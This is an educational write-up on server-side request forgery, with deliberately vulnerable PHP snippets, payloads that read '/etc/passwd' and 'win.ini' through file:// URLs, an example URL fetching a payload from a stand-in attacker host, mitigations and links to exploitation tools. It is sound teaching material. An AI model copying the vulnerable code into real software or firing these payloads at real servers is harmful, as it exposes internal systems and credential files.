# Server Side Request Forgery (SSRF)

> Is a web vulnerability that allows the attacker to interact with the internal infrastructure of the target which is not accessible from outside the target network .

## Impact

SSRF can cause unauthorized actions or access to sensitive data , in some cases it can lead to arbitrary command execution (RCE).

Things to be done:
	1. Port scan intranet and external Internet facing servers
	2. Fingerprint internal (non-Internet exposed) network aware services
	3. Run code on reachable machines
	4. Enumerate and attack services that are running on these hosts
	
## Types of SSRF
1. **Basic SSRF** - Attacker is able to fetch the full response of an internal/external resource ( File , HTTP , etc ) 
2. **Blind SSRF** - Blind SSRF is harder to exploit  , Request is successfully sent but no response is returned to the attacker.

## Testing
A simple SSRF vulnerable snippet is as below:
```
<?php
$content = file_get_contents($_GET['url']);
echo $content
?>
```

URL is passed via GET method and the server fetcges the content and displays it.

Another PHP function that can lead to SSRF is:
	* fopen()
	* fread()
	* fsockopen()
	* curl_exec()

When testing for SSRF our target is any input / parameter / cookie , etc that accepts a URL from the user .

**SSRF example**:
```
<!DOCTYPE html>
<html>
	<head>
		<title>Demo</title>
	</head>
	<body>
		<form action="" method="POST">
			<input type="text" name="url" placeholder="http://abc.com">
			<br>
			<input type="submit" value="submit">
		</form>
		<hr>
		<pre>
		<?php
		if(empty($_POST["url"])) exit(1);
		$url = $_POST['url'];
		$data = file_get_contents($url);
		echo htmlspecialchars($data);
		?>
	</body>
</html>
```

This is a simple php application that  takes a url from the user through POST parameter and fetches the data from the provided url by `file_get_contents` function, then it will echo it into the web page.

The only problem with the above php code is that there is no validation for the user-input and that can be used by the attacker to read the internal/external resources of the web application infrastructure.

This can also be changed the URI protocol handler to `file:///` to read files from the vulnerable server.

Eg: `file:///etc/passwd` allows one to read the password file of the linux server and for the windows can be modified to: `file:///C:/Windows/win.ini`

There are alot of protocol handlers which can be used on different platforms and the common ones are:
	- SSH (scp://, sftp://)
	- POP3
	- IMAP
	- SMTP
	- FTP
	- DICT
	- GOPHER
	- TFTP
	- JAR
	- LDAP

Also SSRF can be used to expose sensitive information(ex.ssh keys) like cloud server meta-data (AWS, Google, Digital Ocean etc)

SSRF can also be mixed with other vulnerabilities. Reflected XSS can be achieved by fetching a file (which contains malicious payload) from an external host eg `http://vulnerable-site.com?url=http://attacker-host.com/poc.svg`

Another case that can lead to SSRF , is when the application uses XML , the attacker can inject SSRF payload in the XML file which will lead to SSRF through XXE .

## Mitigation
1. Make a whitelist for the IPs that the web application needs to access.
2. Disable unnecessary URL schemes (eg dict:// , file:// , ftp:// ,etc)
3. Use authentication for the internal resources/services.

## Tools
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap) : Automatic SSRF fuzzer and exploitation tool.
- [Gopherus](https://github.com/tarunkant/Gopherus) : This tool generates gopher link for exploiting SSRF and gaining RCE in various servers.
